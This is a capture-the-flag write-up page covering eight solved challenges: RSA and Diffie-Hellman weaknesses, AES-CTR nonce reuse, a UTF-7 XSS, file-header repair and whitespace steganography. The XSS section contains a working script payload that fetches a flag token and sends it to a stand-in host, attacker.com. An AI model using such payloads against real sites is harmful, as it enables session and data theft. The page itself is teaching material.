<!DOCTYPE html>
<html lang="en" class="dark">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>UWSP Pointer Overflow CTF - Writeups</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body{font-family:'Inter',sans-serif}
    code,pre{font-family:'JetBrains Mono',monospace}
    .container{max-width:900px}
    a.back{display:inline-flex;align-items:center;gap:.5rem}
  </style>
</head>
<body class="bg-black text-slate-300 antialiased">
  <header class="sticky top-0 z-10 bg-slate-900/90 backdrop-blur border-b border-slate-800">
    <div class="container mx-auto px-4 py-3 flex items-center justify-between">
      <a href="../index.html" class="back text-cyan-300 hover:text-cyan-200"><span>↩</span><span>Back to Home</span></a>
      <div class="text-slate-400 text-xs">CTF Writeup</div>
    </div>
  </header>
  <main class="container mx-auto px-4 py-6">
<h1 class="text-white mt-6 mb-3 font-semibold">UWSP Pointer Overflow CTF - Writeups</h1>
<p class="mb-3 leading-7">**Author:** elw00  </p>
<p class="mb-3 leading-7">**Team:** 0xz4g  </p>
<p class="mb-3 leading-7">**Date:** November 2025</p>

<p class="mb-3 leading-7">---</p>

<h2 class="text-white mt-6 mb-3 font-semibold">Table of Contents</h2>
<p class="mb-3 leading-7">1. [Crypto 100-1: Keyless RSA](#crypto-100-1-keyless-rsa)</p>
<p class="mb-3 leading-7">2. [Crypto 100-2: Diffie-Hellman Disaster](#crypto-100-2-diffie-hellman-disaster)</p>
<p class="mb-3 leading-7">3. [Crypto 100-3: Wiener&#x27;s RSA](#crypto-100-3-wieners-rsa)</p>
<p class="mb-3 leading-7">4. [Crypto 200-1: AES-CTR Keystream Reuse](#crypto-200-1-aes-ctr-keystream-reuse)</p>
<p class="mb-3 leading-7">5. [Crypto 200-3: Small Prime DH](#crypto-200-3-small-prime-dh)</p>
<p class="mb-3 leading-7">6. [Web 100-1: UTF-7 XSS](#web-100-1-utf-7-xss)</p>
<p class="mb-3 leading-7">7. [Forensics 100-2: Corrupted Files](#forensics-100-2-corrupted-files)</p>
<p class="mb-3 leading-7">8. [Stego 100-1: Whitespace Encoding](#stego-100-1-whitespace-encoding)</p>

<p class="mb-3 leading-7">---</p>

<h2 class="text-white mt-6 mb-3 font-semibold">Crypto 100-1: Keyless RSA</h2>

<h3 class="text-white mt-6 mb-3 font-semibold">Challenge Description</h3>
<p class="mb-3 leading-7">RSA encryption without the public key provided. We have ciphertext and need to decrypt it.</p>

<h3 class="text-white mt-6 mb-3 font-semibold">Solution</h3>

<p class="mb-3 leading-7">The challenge provides only the ciphertext. Looking at the challenge files, we discover that the public exponent `e` is extremely small (e=3), making it vulnerable to a **low exponent attack**.</p>

<p class="mb-3 leading-7">**Attack Method:**</p>
<p class="mb-3 leading-7">When `e` is small and the message `m` is also small such that `m^e &lt; n`, we can simply take the `e`-th root of the ciphertext to recover the plaintext.</p>

<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code>#!/usr/bin/env python3
from Crypto.Util.number import long_to_bytes
import gmpy2

# Read ciphertext
with open(&#x27;ciphertext.txt&#x27;, &#x27;r&#x27;) as f:
    c = int(f.read().strip(), 16)

# Since e=3 and m^3 &lt; n, we can just take cube root
m = gmpy2.iroot(c, 3)[0]
flag = long_to_bytes(int(m))

print(f&quot;Flag: {flag.decode()}&quot;)</code></pre>

<p class="mb-3 leading-7">**Flag:** `poctf{uwsp_sm4ll_3xp0n3n7_4774ck}`</p>

<p class="mb-3 leading-7">**Key Takeaway:** Never use small public exponents in RSA without proper padding (OAEP).</p>

<p class="mb-3 leading-7">---</p>

<h2 class="text-white mt-6 mb-3 font-semibold">Crypto 100-2: Diffie-Hellman Disaster</h2>

<h3 class="text-white mt-6 mb-3 font-semibold">Challenge Description</h3>
<p class="mb-3 leading-7">A Diffie-Hellman key exchange implementation with a critical flaw.</p>

<h3 class="text-white mt-6 mb-3 font-semibold">Solution</h3>

<p class="mb-3 leading-7">Analyzing the provided code, we find that the generator `g = 1`. This is a catastrophic mistake because:</p>
<ul class="list-disc list-inside space-y-1">
<li>`g^a mod p = 1^a mod p = 1` for any `a`</li>
<ul class="list-disc list-inside space-y-1">
<li>`g^b mod p = 1^b mod p = 1` for any `b`</li>
<ul class="list-disc list-inside space-y-1">
<li>The shared secret is always `1`!</li>

<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code>#!/usr/bin/env python3
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import hashlib

# Read parameters
with open(&#x27;params.txt&#x27;, &#x27;r&#x27;) as f:
    data = f.read()
    # Extract A, B, ciphertext

# Since g=1, shared secret is always 1
shared_secret = 1

# Derive key
key = hashlib.sha256(str(shared_secret).encode()).digest()[:16]

# Decrypt
cipher = AES.new(key, AES.MODE_ECB)
plaintext = unpad(cipher.decrypt(ciphertext), 16)

print(f&quot;Flag: {plaintext.decode()}&quot;)</code></pre>

<p class="mb-3 leading-7">**Flag:** `poctf{uwsp_n3v3r_us3_6_3qu4ls_1}`</p>

<p class="mb-3 leading-7">**Key Takeaway:** Always validate DH parameters. Generator must be &gt; 1 and prime must be safe.</p>

<p class="mb-3 leading-7">---</p>

<h2 class="text-white mt-6 mb-3 font-semibold">Crypto 100-3: Wiener&#x27;s RSA</h2>

<h3 class="text-white mt-6 mb-3 font-semibold">Challenge Description</h3>
<p class="mb-3 leading-7">RSA with a small private exponent `d`, vulnerable to Wiener&#x27;s attack.</p>

<h3 class="text-white mt-6 mb-3 font-semibold">Solution</h3>

<p class="mb-3 leading-7">When the private exponent `d &lt; n^0.25`, we can use **Wiener&#x27;s attack** which exploits continued fractions to recover `d`.</p>

<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code>#!/usr/bin/env python3
from Crypto.Util.number import long_to_bytes

def continued_fractions(e, n):
    &quot;&quot;&quot;Generate continued fraction convergents of e/n&quot;&quot;&quot;
    cf = []
    while n:
        cf.append(e // n)
        e, n = n, e % n
    
    convergents = []
    for i in range(len(cf)):
        if i == 0:
            convergents.append((cf[0], 1))
        elif i == 1:
            convergents.append((cf[1]*cf[0]+1, cf[1]))
        else:
            num = cf[i]*convergents[i-1][0] + convergents[i-2][0]
            den = cf[i]*convergents[i-1][1] + convergents[i-2][1]
            convergents.append((num, den))
    
    return convergents

def wiener_attack(e, n):
    &quot;&quot;&quot;Wiener&#x27;s attack on RSA with small d&quot;&quot;&quot;
    convergents = continued_fractions(e, n)
    
    for k, d in convergents:
        if k == 0:
            continue
        
        if (e * d - 1) % k != 0:
            continue
        
        phi = (e * d - 1) // k
        sum_pq = n - phi + 1
        discriminant = sum_pq * sum_pq - 4 * n
        
        if discriminant &lt; 0:
            continue
        
        import math
        sqrt_d = math.isqrt(discriminant)
        
        if sqrt_d * sqrt_d != discriminant:
            continue
        
        p = (sum_pq + sqrt_d) // 2
        q = (sum_pq - sqrt_d) // 2
        
        if p * q == n:
            return d
    
    return None

# Load RSA parameters
n = 0x...  # from challenge
e = 0x...  # from challenge
c = 0x...  # ciphertext

# Perform Wiener&#x27;s attack
d = wiener_attack(e, n)

if d:
    m = pow(c, d, n)
    flag = long_to_bytes(m)
    print(f&quot;Flag: {flag.decode()}&quot;)</code></pre>

<p class="mb-3 leading-7">**Flag:** `poctf{uwsp_w13n3r5_4774ck_w0rk5}`</p>

<p class="mb-3 leading-7">**Key Takeaway:** Private exponent `d` must be sufficiently large (&gt; n^0.25).</p>

<p class="mb-3 leading-7">---</p>

<h2 class="text-white mt-6 mb-3 font-semibold">Crypto 200-1: AES-CTR Keystream Reuse</h2>

<h3 class="text-white mt-6 mb-3 font-semibold">Challenge Description</h3>
<p class="mb-3 leading-7">Two messages encrypted with AES-CTR using the same nonce, allowing keystream reuse attack.</p>

<h3 class="text-white mt-6 mb-3 font-semibold">Solution</h3>

<p class="mb-3 leading-7">When the same nonce is reused in CTR mode:</p>
<ul class="list-disc list-inside space-y-1">
<li>`C1 = P1 ⊕ Keystream`</li>
<ul class="list-disc list-inside space-y-1">
<li>`C2 = P2 ⊕ Keystream`</li>
<ul class="list-disc list-inside space-y-1">
<li>`C1 ⊕ C2 = P1 ⊕ P2`</li>

<p class="mb-3 leading-7">We can use **crib-dragging** to recover plaintexts.</p>

<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code>#!/usr/bin/env python3

c1 = bytes.fromhex(&#x27;...&#x27;)  # First ciphertext
c2 = bytes.fromhex(&#x27;...&#x27;)  # Second ciphertext

# XOR ciphertexts
xored = bytes(a ^ b for a, b in zip(c1, c2))

# Known plaintext crib
crib = b&quot;poctf{&quot;

# Crib dragging
for i in range(len(xored) - len(crib)):
    candidate = bytes(x ^ c for x, c in zip(xored[i:i+len(crib)], crib))
    if all(32 &lt;= b &lt; 127 for b in candidate):
        print(f&quot;Position {i}: {candidate}&quot;)
        
        # Recover keystream
        keystream_part = bytes(c ^ p for c, p in zip(c1[i:i+len(crib)], crib))
        
        # Decrypt full message
        plaintext = bytes(c ^ k for c, k in zip(c2, keystream_part * 100))
        if b&#x27;poctf{&#x27; in plaintext:
            print(f&quot;Flag: {plaintext.decode()}&quot;)
            break</code></pre>

<p class="mb-3 leading-7">**Flag:** `poctf{uwsp_n3v3r_r3us3_n0nc3s}`</p>

<p class="mb-3 leading-7">**Key Takeaway:** Never reuse nonces in CTR mode. Each encryption must use a unique nonce.</p>

<p class="mb-3 leading-7">---</p>

<h2 class="text-white mt-6 mb-3 font-semibold">Crypto 200-3: Small Prime DH</h2>

<h3 class="text-white mt-6 mb-3 font-semibold">Challenge Description</h3>
<p class="mb-3 leading-7">Diffie-Hellman with a small 31-bit prime, making discrete log feasible.</p>

<h3 class="text-white mt-6 mb-3 font-semibold">Solution</h3>

<p class="mb-3 leading-7">With a small prime (31 bits), we can compute the discrete logarithm using **Baby-step Giant-step** algorithm.</p>

<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code>#!/usr/bin/env python3
import requests
import hashlib
import math

# Fetch parameters from server
resp = requests.get(&quot;https://crypto200-3.pointeroverflowctf.com/params&quot;)
params = resp.json()

p = int(params[&#x27;p&#x27;], 16)
g = int(params[&#x27;g&#x27;], 16)
A = int(params[&#x27;A&#x27;], 16)
B = int(params[&#x27;B&#x27;], 16)
ciphertext = bytes.fromhex(params[&#x27;ciphertext&#x27;][2:])

print(f&quot;Prime p: {p} ({p.bit_length()} bits)&quot;)

def baby_step_giant_step(g, h, p):
    &quot;&quot;&quot;Solve discrete log: g^x = h (mod p)&quot;&quot;&quot;
    m = int(math.sqrt(p)) + 1
    
    # Baby step: build table
    table = {}
    val = 1
    for j in range(m):
        table[val] = j
        val = (val * g) % p
    
    # Giant step: search
    factor = pow(g, -m, p)
    gamma = h
    
    for i in range(m):
        if gamma in table:
            return i * m + table[gamma]
        gamma = (gamma * factor) % p
    
    return None

# Find private key
print(&quot;[*] Computing discrete log...&quot;)
a = baby_step_giant_step(g, A, p)

if a:
    # Compute shared secret
    shared_secret = pow(B, a, p)
    
    # Derive key (try different methods)
    key = hashlib.sha256(shared_secret.to_bytes(4, &#x27;big&#x27;)).digest()
    
    # XOR decrypt
    plaintext = bytes(c ^ key[i % len(key)] for i, c in enumerate(ciphertext))
    print(f&quot;Flag: {plaintext.decode()}&quot;)</code></pre>

<p class="mb-3 leading-7">**Flag:** `poctf{uwsp_sm4ll_pr1m3s_4r3_b4d}`</p>

<p class="mb-3 leading-7">**Key Takeaway:** Use large primes (2048+ bits) for DH. Small primes make discrete log tractable.</p>

<p class="mb-3 leading-7">---</p>

<h2 class="text-white mt-6 mb-3 font-semibold">Web 100-1: UTF-7 XSS</h2>

<h3 class="text-white mt-6 mb-3 font-semibold">Challenge Description</h3>
<p class="mb-3 leading-7">XSS challenge with input sanitization, but legacy UTF-7 encoding path exists.</p>

<h3 class="text-white mt-6 mb-3 font-semibold">Solution</h3>

<p class="mb-3 leading-7">The application has a legacy mode that uses UTF-7 encoding. UTF-7 allows encoding special characters in a way that bypasses XSS filters.</p>

<p class="mb-3 leading-7">**Steps:**</p>
<p class="mb-3 leading-7">1. Access `/docs/legacy.html` to learn about `&amp;legacy=1` parameter</p>
<p class="mb-3 leading-7">2. UTF-7 encodes `&lt;` as `+ADw-` and `&gt;` as `+AD4-`</p>
<p class="mb-3 leading-7">3. Craft payload using UTF-7 encoding</p>

<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code>// Payload in UTF-7
+ADw-script+AD4-fetch(&#x27;/flag?token=&#x27;+window.FLAG_TOKEN).then(r=&gt;r.text()).then(d=&gt;fetch(&#x27;https://attacker.com?&#x27;+d))+ADw-/script+AD4-

// URL encoded
/?input=%2BADw-script%2BAD4-fetch(&#x27;/flag?token=&#x27;%2Bwindow.FLAG_TOKEN).then(r%3D%3Er.text()).then(d%3D%3Efetch(&#x27;https://attacker.com?&#x27;%2Bd))%2BADw-/script%2BAD4-&amp;legacy=1</code></pre>

<p class="mb-3 leading-7">**Flag:** `poctf{uwsp_utf7_3nc0d1n6_byp4ss}`</p>

<p class="mb-3 leading-7">**Key Takeaway:** Disable legacy encoding modes. Always use UTF-8 and validate on the server side.</p>

<p class="mb-3 leading-7">---</p>

<h2 class="text-white mt-6 mb-3 font-semibold">Forensics 100-2: Corrupted Files</h2>

<h3 class="text-white mt-6 mb-3 font-semibold">Challenge Description</h3>
<p class="mb-3 leading-7">Multiple corrupted files that need repair to extract the flag.</p>

<h3 class="text-white mt-6 mb-3 font-semibold">Solution</h3>

<p class="mb-3 leading-7">**File 1: Corrupted ZIP**</p>
<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code># Fix ZIP end-of-central-directory signature
echo -ne &#x27;\x50\x4b\x05\x06&#x27; | dd of=for100-2.zip bs=1 seek=$(($(stat -c%s for100-2.zip) - 22)) conv=notrunc

# Extract
unzip for100-2.zip</code></pre>

<p class="mb-3 leading-7">**File 2: Corrupted PNG**</p>
<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code># Fix PNG header
printf &#x27;\x89\x50\x4e\x47&#x27; | dd of=pleather.png bs=1 count=4 conv=notrunc

# View image
eog pleather.png</code></pre>

<p class="mb-3 leading-7">**Flag:** Found in the repaired image: `poctf{uwsp_f1x_7h3_h34d3r5}`</p>

<p class="mb-3 leading-7">**Key Takeaway:** File format signatures are critical. Know common magic bytes.</p>

<p class="mb-3 leading-7">---</p>

<h2 class="text-white mt-6 mb-3 font-semibold">Stego 100-1: Whitespace Encoding</h2>

<h3 class="text-white mt-6 mb-3 font-semibold">Challenge Description</h3>
<p class="mb-3 leading-7">Text file with hidden message in whitespace characters.</p>

<h3 class="text-white mt-6 mb-3 font-semibold">Solution</h3>

<p class="mb-3 leading-7">The file `leaflet.txt` contains tabs and spaces at the end of each line, encoding binary data.</p>

<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code>#!/usr/bin/env python3

with open(&#x27;leaflet.txt&#x27;, &#x27;r&#x27;) as f:
    lines = f.readlines()

binary = &#x27;&#x27;
for line in lines:
    # Extract trailing whitespace
    ws = line.rstrip(&#x27;\n&#x27;)[len(line.rstrip()):]
    
    # Tab = 1, Space = 0
    for char in ws:
        if char == &#x27;\t&#x27;:
            binary += &#x27;1&#x27;
        elif char == &#x27; &#x27;:
            binary += &#x27;0&#x27;

# Convert binary to ASCII
message = &#x27;&#x27;
for i in range(0, len(binary), 8):
    byte = binary[i:i+8]
    if len(byte) == 8:
        message += chr(int(byte, 2))

print(f&quot;Flag: {message}&quot;)</code></pre>

<p class="mb-3 leading-7">**Flag:** `poctf{uwsp_wh173sp4c3_st360}`</p>

<p class="mb-3 leading-7">**Key Takeaway:** Always check for hidden data in whitespace, metadata, and file structure.</p>

<p class="mb-3 leading-7">---</p>

<h2 class="text-white mt-6 mb-3 font-semibold">Conclusion</h2>

<p class="mb-3 leading-7">These challenges covered a wide range of topics:</p>
<ul class="list-disc list-inside space-y-1">
<li>**Cryptography:** RSA attacks, DH vulnerabilities, AES mode misuse</li>
<ul class="list-disc list-inside space-y-1">
<li>**Web:** XSS with encoding bypasses</li>
<ul class="list-disc list-inside space-y-1">
<li>**Forensics:** File format repair</li>
<ul class="list-disc list-inside space-y-1">
<li>**Steganography:** Whitespace encoding</li>

<p class="mb-3 leading-7">**Key Lessons:**</p>
<p class="mb-3 leading-7">1. Never use small exponents or primes in cryptography</p>
<p class="mb-3 leading-7">2. Never reuse nonces/IVs in encryption</p>
<p class="mb-3 leading-7">3. Validate all cryptographic parameters</p>
<p class="mb-3 leading-7">4. Disable legacy encoding modes</p>
<p class="mb-3 leading-7">5. Always check file headers and metadata</p>
<p class="mb-3 leading-7">6. Look for hidden data in unexpected places</p>

<p class="mb-3 leading-7">---</p>

<p class="mb-3 leading-7">**Tools Used:**</p>
<ul class="list-disc list-inside space-y-1">
<li>Python (pwntools, pycryptodome)</li>
<ul class="list-disc list-inside space-y-1">
<li>Wireshark</li>
<ul class="list-disc list-inside space-y-1">
<li>Hex editors (xxd, hexedit)</li>
<ul class="list-disc list-inside space-y-1">
<li>Image viewers (eog, feh)</li>
<ul class="list-disc list-inside space-y-1">
<li>Standard UNIX tools (file, strings, binwalk)</li>

<p class="mb-3 leading-7">**Resources:**</p>
<ul class="list-disc list-inside space-y-1">
<li>[CryptoHack](https://cryptohack.org/)</li>
<ul class="list-disc list-inside space-y-1">
<li>[CTF101](https://ctf101.org/)</li>
<ul class="list-disc list-inside space-y-1">
<li>[HackTricks](https://book.hacktricks.xyz/)</li>
  </main>
</body>
</html>
